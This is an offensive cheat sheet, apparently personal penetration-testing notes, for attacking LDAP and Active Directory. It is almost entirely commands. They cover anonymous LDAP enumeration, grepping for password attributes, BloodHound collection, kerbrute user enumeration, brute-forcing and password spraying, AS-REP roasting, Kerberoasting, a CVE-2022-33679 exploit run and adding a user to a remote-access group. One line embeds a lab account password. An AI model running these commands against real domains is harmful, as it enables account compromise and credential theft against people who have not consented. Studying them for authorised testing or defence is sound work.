# LDAP - Ports 389,636,3268,3269

```bash
# Check if password policy was manually made easier, hidden passwords
ldapsearch -x -h $ip -s base # null bind connection
ldapsearch -x -H ldap://$ip
ldapsearch -x -H ldap://$ip -s base namingcontexts
ldapsearch -x -H ldap://$ip -b "DC=,DC="
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)'
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' sAMAccountName sAMAccountType
ldapsearch -x -H ldap://$ip -b "DC=DomainDnsZones,DC=,DC="
ldapsearch -H ldap://$ip -D "$user@$dom" -w "$pass" -b 'dc=,dc='
ldapsearch -x -H ldap://$ip -b "DC=,DC=" | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:" | grep -i "pass\|pwd"
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:"
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:" | grep -i "pass\|pwd"
ldapsearch -LLL -x -H ldap://$ip -b'DC=absolute,DC=htb' -s base '(objectclass=\*)'

# Automates the above
/opt/ldappy.sh $ip -u $user -p $pass -d $dom

/opt/legba/legba ldap --target $ip:389 --username administrator --password custom-passwords.txt --ldap-domain $dom --single-match
ldapdomaindump $dom --no-json --no-html
ldapdomaindump $ip -u "$dom\\$user" -p $pass --no-json --no-grep [--authtype SIMPLE]
/opt/ldapper -D $dom -U $user -P $pass -S $ip -m 0  -s '(cn=*)' cn
python ldapper.py -D 'domain' -U 'user' -P 'pass' --server $dom --maxrecords 0 --search 1 | grep samaccountname | awk -F':' '{print $2}' > usernames.txt
bloodhound-python -d $dom -v --zip -c All -dc $ip -ns $ip
bloodhound-python -u $user -p $pass -d $dom -v --zip -c All -dc $dc -ns $ip
bloodhound-python -u $user -p $pass -k -d $dom -dc $dc -c ALL --zip
bloodhound-python -u $user -p $pass -k -d $dom -dc $dc -c ALL -ns $ip --zip
ldeep cache -d "$dom" -p "$dom" trusts
ldeep ldap -u $user -p $pass -d $dom -s ldap://$dom add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM" # Then try evil-winrm

# If you attempt to authenticate to an AD server via Kerberos, it's going to say 'hey, continue with pre-authentication'. It doesn't do that with invalid names. Kerbrute is only kerberos users.
/opt/kerbrute userenum usernames.txt -d "$dom" --dc $ip
/opt/kerbrute userenum -d $dom --dc $ip /opt/SecLists/Usernames/xato-net-10-million-usernames-dup-lowercase.txt -t 100
/opt/kerbrute userenum -d $dom --dc $ip /opt/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -t 100
/opt/kerbrute userenum -d $dom --dc $ip custom-wordlist.txt -t 100
cewl -g --with-numbers -d 20 $url |grep -v CeWL > custom-wordlist.txt
hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule custom-wordlist.txt >> custom-passwords.txt
awk 'NR==FNR {a[$1]; next} {for (i in a) print $1 ":" i}' custom-passwords.txt users.txt > combined.txt
/opt/kerbrute bruteuser -d $dom custom-passwords.txt administrator --dc $ip
for i in $(cat users.txt); do echo "$i:$i" >> combo.txt; done
/opt/kerbrute bruteforce combo.txt -d $dom --dc $ip
/opt/kerbrute passwordspray -d $dom --dc $ip users.txt $pass

impacket-GetADUsers -dc-ip $ip "$dom/" -all
impacket-GetADUsers -dc-ip $ip $dom/$user:$pass -all

# Even if you don't have a password, use their username to auth
GetNPUsers.py -request -format hashcat -outputfile asrep.txt "$dom/$user"
for u in $(cat users.txt); do GetNPUsers.py -request -format hashcat -outputfile asrep.txt "$dom/$u"; wait; done
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip "$dom/"
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip $dom/$user:$pass
GetNPUsers.py $dom/ -dc-ip $ip -usersfile users.txt -format hashcat -outputfile hashes.txt
GetNPUsers.py htb.local/svc-alfresco -no-pass
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast
nxc ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt

# CVE-2022-33679 ( If you can't crack ASREP hash )
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
user@hostname:~$ python CVE-2022-33679.py $dom/User DC01.$dom
user@hostname:~$ export KRB5CCNAME=/home/project/User.ccache
user@hostname:~$ netexec smb DC01.$dom -k --shares

# Kerberoasting
impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom/"
impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom"/"$user":"$pass"
nxc ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt
Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local" # powerview
Rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt # Kerberoast (RC4 ticket)
Rubeus.exe kerberoast /tgtdeleg # Kerberoast (AES ticket), Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.
Rubeus.exe kerberoast /rc4opsec # Kerberoast (RC4 ticket), The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.

# Kerberoasting without domain account
# Prereqs: have a list of users, be able to query KDC
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.$dom" "$dom"/ 
```

````
ldapsearch -x -H ldap://$ip

# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 32 No such object
text: 0000208D: NameErr: DSID-0310021C, problem 2001 (NO_OBJECT), data 0, best 
 match of:
        ''


# numResponses: 1
````

````
ldapsearch -x -H ldap://$ip -s base namingcontexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=exampleH,DC=example
namingcontexts: CN=Configuration,DC=exampleH,DC=example
namingcontexts: CN=Schema,CN=Configuration,DC=exampleH,DC=example
namingcontexts: DC=DomainDnsZones,DC=exampleH,DC=example
namingcontexts: DC=ForestDnsZones,DC=exampleH,DC=example

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
````

````
ldapsearch -x -H ldap://$ip
ldapsearch -x -H ldap://$ip -s base namingcontexts
ldapsearch -x -H ldap://$ip -b "DC=exampleH,DC=example"
ldapsearch -x -H ldap://$ip -b "DC=exampleH,DC=example" '(objectClass=Person)'
ldapsearch -x -H ldap://$ip -b "DC=exampleH,DC=example" '(objectClass=Person)' sAMAccountName sAMAccountType
ldapsearch -x -H ldap://$ip  "DC=DomainDnsZones,DC=support,DC=htb"
ldapsearch -H ldap://$ip -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'dc=support,dc=htb'

ldapsearch … -Y GSSAPI
````